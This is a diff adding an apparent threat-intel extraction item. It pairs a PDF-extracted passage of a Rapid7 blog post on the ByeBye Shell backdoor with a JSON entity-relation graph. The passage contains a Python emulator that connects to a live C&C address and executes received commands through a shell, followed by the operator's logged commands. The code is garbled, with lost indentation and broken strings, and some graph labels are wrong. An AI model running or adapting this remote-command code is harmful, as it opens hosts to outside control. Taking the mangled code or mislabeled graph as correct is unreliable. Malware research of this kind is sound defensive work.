@@ -1,0 +1,190 @@
+
+
+
+Sentence : Playing with the Attacker
+```
+In all the cases presented in this blog post, the backdoors tried to connect to the C&C
+located at 46.165.207.134, which appears to be a dedicated server hosted by Leaseweb :
+inetnum:    46.165.200.0 - 46.165.207.255
+netname:    NETDIRECT-NET
+descr:     Leaseweb Germany GmbH (previously netdirekt e. K.)
+remarks:    INFRA-AW
+country:    DE
+https://www.rapid7.com/blog/post/2013/08/19/byebye-and-the-targeting-of-pakistan/ 10/15
+8/15/22, 3:23 PM ByeBye Shell and the targeting of Pakistan | Rapid7 Blog
+admin-c:    LSWG-RIPE
+tech-c:     LSWG-RIPE
+status:     ASSIGNED PA
+mnt-by:     NETDIRECT-MNT
+mnt-lower:   NETDIRECT-MNT
+mnt-routes:   NETDIRECT-MNT
+source:     RIPE # Filtered
+At the time of writing, the server appears to still be online. However port 80, which the
+backdoors try to contact, appears to be available only sporadically. In order to get some
+fun out of an overall straightforward analysis, I quickly hacked together a Python script
+that emulates a ByeBye backdoor   - following is the code:
+https://www.rapid7.com/blog/post/2013/08/19/byebye-and-the-targeting-of-pakistan/ 11/15
+8/15/22, 3:23 PM ByeBye Shell and the targeting of Pakistan | Rapid7 Blog
+```
+   import os
+   import sys
+   import socket
+   import subprocess
+def main(host='46.165.207.134'):
+   # This is the check-in message.
+buf = "HOMEPC-OF-User:
+192.168.0.5............................................................UserName:
+User\n"
+buf = "HostName:HOMEPC\n"
+buf = "MAC: \n"
+buf = "Address 0: 192.168.0.5\n"
+buf = "[P100713]\n"
+buf = "$"
+# Emulating cmd.exe, hacky but works.
+   cmd = "Microsoft Windows XP [Version 5.1.2600]\n"
+   cmd = "(C) Copyright 1985-2001 Microsoft Corp.\n"
+   prompt = "C:\Documents and Settings\User> "
+print("[*] Trying to connect to C&C...")
+# Try to establish connection with the C&C.
+while True:
+try:
+   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   sock.connect((host, 80))
+except Exception as e:
+   print("[!] ERROR: Unable to connect: {0}".format(e))
+   sock.close()
+continue
+else:
+subprocess.Popen('start alarm.mp3', shell=True)
+break
+print("[*] Connected to C&C!")
+# Send check-in message.
+   sock.send(buf)
+print("[*] Authenticated to C&C!")
+# This flag represents whether we should currently emulate a cmd.exe prompt
+# or emulate the backdoor shell.
+shell_mode = False
+# Main loop.
+while True:
+# Wait for incoming command.
+try:
+   bufin = sock.recv(1024)
+except KeyboardInterrupt:
+break
+except Exception as e:
+```
+https://www.rapid7.com/blog/post/2013/08/19/byebye-and-the-targeting-of-pakistan/ 12/15
+8/15/22, 3:23 PM ByeBye Shell and the targeting of Pakistan | Rapid7 Blog
+```
+   print("[!] ERROR: Connection lost: {0}".format(e))
+break
+data = bufin.strip()
+   if len(data) == 0:
+continue
+print("[ ] Received: {0}".format(data))
+# If we are in cmd.exe mode...
+if shell_mode:
+# If he tries to exit the cmd, we emulate that.       if data in
+   ('quit', 'exit'):
+   shell_mode = False
+   sock.send('/pre>)
+continue
+# If he tries to shutdown the system, I'm gonna interrupt.
+   elif 'shutdown' in data:
+break
+# I don't want him to kill processes.
+elif 'taskkill' in data:
+continue
+# Otherwise just execute the command.
+else:
+proc = subprocess.Popen(data, stdout=subprocess.PIPE,
+   stderr=subprocess.PIPE, shell=True)
+   (out, err) = proc.communicate()
+if out:
+lines = out.split('\n')
+   out_lines = []
+for line in lines:
+# Can filter output here, for instance remove process
+# names or VirtualBox indicators and such.
+out_lines.append(line)
+# Send the findal cmd output.
+   sock.send('\n'.join(out_lines))
+   if err:
+sock.send(err)
+sock.send(prompt)
+else:
+if data == 'kill':
+# Should do this:
+#sock.send('KILLED')
+# But I'm disappointed:
+   sock.send('NOOooOOooOOooOOoo :-( I thought we were friends!')
+break
+elif data == 'shell':
+sock.send(cmd)
+sock.send(prompt)
+   shell_mode = True
+continue
+elif data == 'sleep':
+```
+https://www.rapid7.com/blog/post/2013/08/19/byebye-and-the-targeting-of-pakistan/ 13/15
+8/15/22, 3:23 PM ByeBye Shell and the targeting of Pakistan | Rapid7 Blog
+```
+   sock.send('BYE BYE\n')
+sock.send('/pre>)
+if name == 'main':
+   if len(sys.argv) == 2:
+   main(sys.argv[1])
+else:
+main()
+```
+As you can see, this script simply tries to emulate the basic functionality of ByeBye: it
+performs the initial check-in and waits for incoming messages from the operator.
+Yes - since, as previously said, the C&C comes online only at times - I instructed the script
+to play an extremely loud alarm. Props to my flatmate for waking me up whenever the
+alarm went off.
+Surprisingly the operator responded few moments later my first attempt, although he
+quickly tried to terminate me probably noticing an unexpected origin:
+[ ] Received: kill
+[ ] Received: kill
+[ ] Received: shell
+[ ] Received: shutdown /r /t 0
+Unfortunately at that time I didn't have the script completed, therefore he noticed
+something odd and closed my connection.
+I let a few days pass, completed the script and prepared a more credible scenario: a
+legitimate looking system connecting out of South Asia. This time it took a bit longer to
+get some response from the operator, who simply tried to search for documents on
+the system :
+[ ] Received: shell
+[ ] Received: systeminfo
+[ ] Received: dir /s *.pdf
+[ ] Received: dir /s *.doc
+[ ] Received: exit
+[ ] Received: sleep
+Sadly no further activity was observed.
+https://www.rapid7.com/blog/post/2013/08/19/byebye-and-the-targeting-of-pakistan/ 14/15
+8/15/22, 3:23 PM ByeBye Shell and the targeting of Pakistan | Rapid7 Blog
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "C&C server", "type" : "CCSH"},
+        {"id": 2, "description": "46.165.207.134", "type" : "CCSH"},
+        {"id": 3, "description": "Leaseweb Germany GmbH (previously netdirekt e. K.)", "type" : "COUN"},
+        {"id": 4, "description": "DE", "type" : "COUN"},
+        {"id": 5, "description": "Rapid7 Blog", "type" : "URLS"},
+        {"id": 6, "description": "Python script", "type" : "EXEF"},
+        {"id": 7, "description": "HOMEPC-OF-User:192.168.0.5", "type" : "SYSP"},
+        {"id": 8, "description": "Microsoft Windows XP [Version 5.1.2600]", "type" : "OPPS"},
+        {"id": 9, "description": "C:\Documents and Settings\User>", "type" : "TPTH"},
+        {"id": 10, "description": "alarm.mp3", "type" : "DOCF"},
+        {"id": 11, "description": "South Asia", "type" : "COUN"}
+    ],
+    "edges": [
+        {"source": 2, "target": 1, "rel_name" : "is a"},
+        {"source": 3, "target": 4, "rel_name" : "located in"},
+        {"source": 6, "description": "emulates", "target": 2},
+        {"source": 7, "target": 9, "rel_name" : "uses path"},
+        {"source": 8, "target": 7, "rel_name" : "runs on"},
+        {"source": 10, "target": 6, "rel_name" : "played by"},
+        {"source": 2, "target": 5, "rel_name" : "mentioned in"}
+    ]
+}
